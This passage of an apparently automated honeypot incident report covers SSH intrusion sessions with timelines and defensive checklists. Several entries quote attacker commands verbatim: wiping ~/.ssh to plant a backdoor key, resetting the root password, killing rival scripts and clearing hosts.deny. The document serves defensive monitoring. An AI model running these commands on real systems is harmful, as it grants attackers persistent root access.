| `2026-04-10 15:30:39` | `cowrie.client.version` |
| `2026-04-10 15:30:39` | `cowrie.client.kex` |
| `2026-04-10 15:30:40` | `cowrie.login.success` |
| `2026-04-10 15:30:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.147.20[.]241` to AbuseIPDB if not already reported
- [ ] Block `189.147.20[.]241` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae290280a601

| Field | Detail |
|---|---|
| **Source IP** | `43.156.71[.]43` |
| **First Seen** | 2026-04-10 15:34 |
| **Last Seen** | 2026-04-10 15:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:34:00` | `cowrie.session.connect` |
| `2026-04-10 15:34:00` | `cowrie.client.version` |
| `2026-04-10 15:34:00` | `cowrie.client.kex` |
| `2026-04-10 15:34:00` | `cowrie.login.success` |
| `2026-04-10 15:34:00` | `cowrie.session.params` |
| `2026-04-10 15:34:00` | `cowrie.command.input` |
| `2026-04-10 15:34:00` | `cowrie.command.failed` |
| `2026-04-10 15:34:00` | `cowrie.log.closed` |
| `2026-04-10 15:34:00` | `cowrie.session.params` |
| `2026-04-10 15:34:00` | `cowrie.command.input` |
| `2026-04-10 15:34:00` | `cowrie.session.file_download` |
| `2026-04-10 15:34:00` | `cowrie.log.closed` |
| `2026-04-10 15:34:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.156.71[.]43` to AbuseIPDB if not already reported
- [ ] Block `43.156.71[.]43` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf0558f95e12

| Field | Detail |
|---|---|
| **Source IP** | `43.156.71[.]43` |
| **First Seen** | 2026-04-10 15:34 |
| **Last Seen** | 2026-04-10 15:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:34:02` | `cowrie.session.connect` |
| `2026-04-10 15:34:02` | `cowrie.client.version` |
| `2026-04-10 15:34:02` | `cowrie.client.kex` |
| `2026-04-10 15:34:02` | `cowrie.login.success` |
| `2026-04-10 15:34:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.156.71[.]43` to AbuseIPDB if not already reported
- [ ] Block `43.156.71[.]43` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44fad835180f

| Field | Detail |
|---|---|
| **Source IP** | `121.229.27[.]155` |
| **First Seen** | 2026-04-10 15:34 |
| **Last Seen** | 2026-04-10 15:34 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:34:33` | `cowrie.session.connect` |
| `2026-04-10 15:34:33` | `cowrie.client.version` |
| `2026-04-10 15:34:33` | `cowrie.client.kex` |
| `2026-04-10 15:34:36` | `cowrie.login.success` |
| `2026-04-10 15:34:37` | `cowrie.session.params` |
| `2026-04-10 15:34:37` | `cowrie.command.input` |
| `2026-04-10 15:34:37` | `cowrie.command.failed` |
| `2026-04-10 15:34:37` | `cowrie.log.closed` |
| `2026-04-10 15:34:38` | `cowrie.session.params` |
| `2026-04-10 15:34:38` | `cowrie.command.input` |
| `2026-04-10 15:34:38` | `cowrie.session.file_download` |
| `2026-04-10 15:34:38` | `cowrie.log.closed` |
| `2026-04-10 15:34:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.229.27[.]155` to AbuseIPDB if not already reported
- [ ] Block `121.229.27[.]155` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed3ae70cbd9b

| Field | Detail |
|---|---|
| **Source IP** | `121.229.27[.]155` |
| **First Seen** | 2026-04-10 15:34 |
| **Last Seen** | 2026-04-10 15:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:34:47` | `cowrie.session.connect` |
| `2026-04-10 15:34:47` | `cowrie.client.version` |
| `2026-04-10 15:34:47` | `cowrie.client.kex` |
| `2026-04-10 15:34:49` | `cowrie.login.success` |
| `2026-04-10 15:34:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.229.27[.]155` to AbuseIPDB if not already reported
- [ ] Block `121.229.27[.]155` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2cfcfa2d19d2

| Field | Detail |
|---|---|
| **Source IP** | `121.229.27[.]155` |
| **First Seen** | 2026-04-10 15:34 |
| **Last Seen** | 2026-04-10 15:35 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:34:50` | `cowrie.session.connect` |
| `2026-04-10 15:34:50` | `cowrie.client.version` |
| `2026-04-10 15:34:50` | `cowrie.client.kex` |
| `2026-04-10 15:34:52` | `cowrie.login.success` |
| `2026-04-10 15:34:54` | `cowrie.session.params` |
| `2026-04-10 15:34:54` | `cowrie.command.input` |
| `2026-04-10 15:34:54` | `cowrie.command.failed` |
| `2026-04-10 15:34:54` | `cowrie.log.closed` |
| `2026-04-10 15:34:55` | `cowrie.session.params` |
| `2026-04-10 15:34:55` | `cowrie.command.input` |
| `2026-04-10 15:34:55` | `cowrie.session.file_download` |
| `2026-04-10 15:34:55` | `cowrie.log.closed` |
| `2026-04-10 15:35:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.229.27[.]155` to AbuseIPDB if not already reported
- [ ] Block `121.229.27[.]155` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3025f1f3157

| Field | Detail |
|---|---|
| **Source IP** | `121.229.27[.]155` |
| **First Seen** | 2026-04-10 15:35 |
| **Last Seen** | 2026-04-10 15:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:35:01` | `cowrie.session.connect` |
| `2026-04-10 15:35:01` | `cowrie.client.version` |
| `2026-04-10 15:35:01` | `cowrie.client.kex` |
| `2026-04-10 15:35:01` | `cowrie.login.success` |
| `2026-04-10 15:35:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.229.27[.]155` to AbuseIPDB if not already reported
- [ ] Block `121.229.27[.]155` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ad2a3dcb568

| Field | Detail |
|---|---|
| **Source IP** | `121.229.27[.]155` |
| **First Seen** | 2026-04-10 15:35 |
| **Last Seen** | 2026-04-10 15:35 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:35:11` | `cowrie.session.connect` |
| `2026-04-10 15:35:11` | `cowrie.client.version` |
| `2026-04-10 15:35:11` | `cowrie.client.kex` |
| `2026-04-10 15:35:14` | `cowrie.login.success` |
| `2026-04-10 15:35:14` | `cowrie.session.params` |
| `2026-04-10 15:35:14` | `cowrie.command.input` |
| `2026-04-10 15:35:14` | `cowrie.command.failed` |
| `2026-04-10 15:35:15` | `cowrie.log.closed` |
| `2026-04-10 15:35:15` | `cowrie.session.params` |
| `2026-04-10 15:35:15` | `cowrie.command.input` |
| `2026-04-10 15:35:15` | `cowrie.session.file_download` |
| `2026-04-10 15:35:15` | `cowrie.log.closed` |
| `2026-04-10 15:35:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.229.27[.]155` to AbuseIPDB if not already reported
- [ ] Block `121.229.27[.]155` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b07a711c9d6

| Field | Detail |
|---|---|
| **Source IP** | `121.229.27[.]155` |
| **First Seen** | 2026-04-10 15:35 |
| **Last Seen** | 2026-04-10 15:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:35:22` | `cowrie.session.connect` |
| `2026-04-10 15:35:22` | `cowrie.client.version` |
| `2026-04-10 15:35:22` | `cowrie.client.kex` |
| `2026-04-10 15:35:23` | `cowrie.login.success` |
| `2026-04-10 15:35:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.229.27[.]155` to AbuseIPDB if not already reported
- [ ] Block `121.229.27[.]155` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f88b2ee95bb

| Field | Detail |
|---|---|
| **Source IP** | `121.229.27[.]155` |
| **First Seen** | 2026-04-10 15:36 |
| **Last Seen** | 2026-04-10 15:36 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:36:25` | `cowrie.session.connect` |
| `2026-04-10 15:36:25` | `cowrie.client.version` |
| `2026-04-10 15:36:25` | `cowrie.client.kex` |
| `2026-04-10 15:36:26` | `cowrie.login.success` |
| `2026-04-10 15:36:27` | `cowrie.session.params` |
| `2026-04-10 15:36:27` | `cowrie.command.input` |
| `2026-04-10 15:36:27` | `cowrie.command.failed` |
| `2026-04-10 15:36:27` | `cowrie.log.closed` |
| `2026-04-10 15:36:27` | `cowrie.session.params` |
| `2026-04-10 15:36:27` | `cowrie.command.input` |
| `2026-04-10 15:36:27` | `cowrie.session.file_download` |
| `2026-04-10 15:36:27` | `cowrie.log.closed` |
| `2026-04-10 15:36:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.229.27[.]155` to AbuseIPDB if not already reported
- [ ] Block `121.229.27[.]155` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06e82bcdddf7

| Field | Detail |
|---|---|
| **Source IP** | `14.103.111[.]135` |
| **First Seen** | 2026-04-10 15:36 |
| **Last Seen** | 2026-04-10 15:36 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:WVBy7WouNkFb"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:36:28` | `cowrie.session.connect` |
| `2026-04-10 15:36:28` | `cowrie.client.version` |
| `2026-04-10 15:36:28` | `cowrie.client.kex` |
| `2026-04-10 15:36:29` | `cowrie.login.success` |
| `2026-04-10 15:36:30` | `cowrie.session.params` |
| `2026-04-10 15:36:30` | `cowrie.command.input` |
| `2026-04-10 15:36:30` | `cowrie.command.failed` |
| `2026-04-10 15:36:31` | `cowrie.log.closed` |
| `2026-04-10 15:36:31` | `cowrie.session.params` |
| `2026-04-10 15:36:31` | `cowrie.command.input` |
| `2026-04-10 15:36:31` | `cowrie.session.file_download` |
| `2026-04-10 15:36:31` | `cowrie.log.closed` |
| `2026-04-10 15:36:39` | `cowrie.session.params` |
| `2026-04-10 15:36:39` | `cowrie.command.input` |
| `2026-04-10 15:36:39` | `cowrie.log.closed` |
| `2026-04-10 15:36:40` | `cowrie.session.params` |
| `2026-04-10 15:36:40` | `cowrie.command.input` |
| `2026-04-10 15:36:40` | `cowrie.log.closed` |
| `2026-04-10 15:36:40` | `cowrie.session.params` |
| `2026-04-10 15:36:40` | `cowrie.command.input` |
| `2026-04-10 15:36:41` | `cowrie.session.file_download` |
| `2026-04-10 15:36:41` | `cowrie.log.closed` |
| `2026-04-10 15:36:41` | `cowrie.session.params` |
| `2026-04-10 15:36:41` | `cowrie.command.input` |
| `2026-04-10 15:36:41` | `cowrie.log.closed` |
| `2026-04-10 15:36:41` | `cowrie.session.params` |
| `2026-04-10 15:36:41` | `cowrie.command.input` |
| `2026-04-10 15:36:42` | `cowrie.log.closed` |
| `2026-04-10 15:36:44` | `cowrie.session.params` |
| `2026-04-10 15:36:44` | `cowrie.command.input` |
| `2026-04-10 15:36:44` | `cowrie.command.input` |
| `2026-04-10 15:36:44` | `cowrie.log.closed` |
| `2026-04-10 15:36:44` | `cowrie.session.params` |
| `2026-04-10 15:36:44` | `cowrie.command.input` |
| `2026-04-10 15:36:44` | `cowrie.log.closed` |
| `2026-04-10 15:36:45` | `cowrie.session.params` |
| `2026-04-10 15:36:45` | `cowrie.command.input` |
| `2026-04-10 15:36:45` | `cowrie.log.closed` |
| `2026-04-10 15:36:45` | `cowrie.session.params` |
| `2026-04-10 15:36:45` | `cowrie.command.input` |
| `2026-04-10 15:36:46` | `cowrie.log.closed` |
| `2026-04-10 15:36:46` | `cowrie.session.params` |
| `2026-04-10 15:36:46` | `cowrie.command.input` |
| `2026-04-10 15:36:46` | `cowrie.log.closed` |
| `2026-04-10 15:36:47` | `cowrie.session.params` |
| `2026-04-10 15:36:47` | `cowrie.command.input` |
| `2026-04-10 15:36:47` | `cowrie.log.closed` |
| `2026-04-10 15:36:48` | `cowrie.session.params` |
| `2026-04-10 15:36:48` | `cowrie.command.input` |
| `2026-04-10 15:36:48` | `cowrie.log.closed` |
| `2026-04-10 15:36:48` | `cowrie.session.params` |
| `2026-04-10 15:36:48` | `cowrie.command.input` |
| `2026-04-10 15:36:49` | `cowrie.log.closed` |
| `2026-04-10 15:36:49` | `cowrie.session.params` |
| `2026-04-10 15:36:49` | `cowrie.command.input` |
| `2026-04-10 15:36:49` | `cowrie.log.closed` |
| `2026-04-10 15:36:50` | `cowrie.session.params` |
| `2026-04-10 15:36:50` | `cowrie.command.input` |
| `2026-04-10 15:36:50` | `cowrie.log.closed` |
| `2026-04-10 15:36:50` | `cowrie.session.params` |
| `2026-04-10 15:36:50` | `cowrie.command.input` |
| `2026-04-10 15:36:50` | `cowrie.log.closed` |
| `2026-04-10 15:36:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.111[.]135` to AbuseIPDB if not already reported
- [ ] Block `14.103.111[.]135` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0057172efbe3

| Field | Detail |
|---|---|
| **Source IP** | `121.229.27[.]155` |
| **First Seen** | 2026-04-10 15:36 |
| **Last Seen** | 2026-04-10 15:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:36:30` | `cowrie.session.connect` |
| `2026-04-10 15:36:30` | `cowrie.client.version` |
| `2026-04-10 15:36:30` | `cowrie.client.kex` |
| `2026-04-10 15:36:30` | `cowrie.login.success` |
| `2026-04-10 15:36:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.229.27[.]155` to AbuseIPDB if not already reported
- [ ] Block `121.229.27[.]155` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5dceb22cf85

| Field | Detail |
|---|---|
| **Source IP** | `121.229.27[.]155` |
| **First Seen** | 2026-04-10 15:36 |
| **Last Seen** | 2026-04-10 15:36 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:36:43` | `cowrie.session.connect` |
| `2026-04-10 15:36:43` | `cowrie.client.version` |
| `2026-04-10 15:36:43` | `cowrie.client.kex` |
| `2026-04-10 15:36:45` | `cowrie.login.success` |
| `2026-04-10 15:36:45` | `cowrie.session.params` |
| `2026-04-10 15:36:45` | `cowrie.command.input` |
| `2026-04-10 15:36:45` | `cowrie.command.failed` |
| `2026-04-10 15:36:45` | `cowrie.log.closed` |
| `2026-04-10 15:36:46` | `cowrie.session.params` |
| `2026-04-10 15:36:46` | `cowrie.command.input` |
| `2026-04-10 15:36:46` | `cowrie.session.file_download` |
| `2026-04-10 15:36:46` | `cowrie.log.closed` |
| `2026-04-10 15:36:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.229.27[.]155` to AbuseIPDB if not already reported
- [ ] Block `121.229.27[.]155` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3969efd377d8

| Field | Detail |
|---|---|
| **Source IP** | `121.229.27[.]155` |
| **First Seen** | 2026-04-10 15:36 |
| **Last Seen** | 2026-04-10 15:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:36:48` | `cowrie.session.connect` |
| `2026-04-10 15:36:48` | `cowrie.client.version` |
| `2026-04-10 15:36:48` | `cowrie.client.kex` |
| `2026-04-10 15:36:49` | `cowrie.login.success` |
| `2026-04-10 15:36:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.229.27[.]155` to AbuseIPDB if not already reported
- [ ] Block `121.229.27[.]155` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eac7ea4a5c36

| Field | Detail |
|---|---|
| **Source IP** | `121.229.27[.]155` |
| **First Seen** | 2026-04-10 15:37 |
| **Last Seen** | 2026-04-10 15:37 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:37:49` | `cowrie.session.connect` |
| `2026-04-10 15:37:49` | `cowrie.client.version` |
| `2026-04-10 15:37:49` | `cowrie.client.kex` |
| `2026-04-10 15:37:50` | `cowrie.login.success` |
| `2026-04-10 15:37:51` | `cowrie.session.params` |
| `2026-04-10 15:37:51` | `cowrie.command.input` |
| `2026-04-10 15:37:51` | `cowrie.command.failed` |
| `2026-04-10 15:37:51` | `cowrie.log.closed` |
| `2026-04-10 15:37:51` | `cowrie.session.params` |
| `2026-04-10 15:37:51` | `cowrie.command.input` |
| `2026-04-10 15:37:51` | `cowrie.session.file_download` |
| `2026-04-10 15:37:51` | `cowrie.log.closed` |
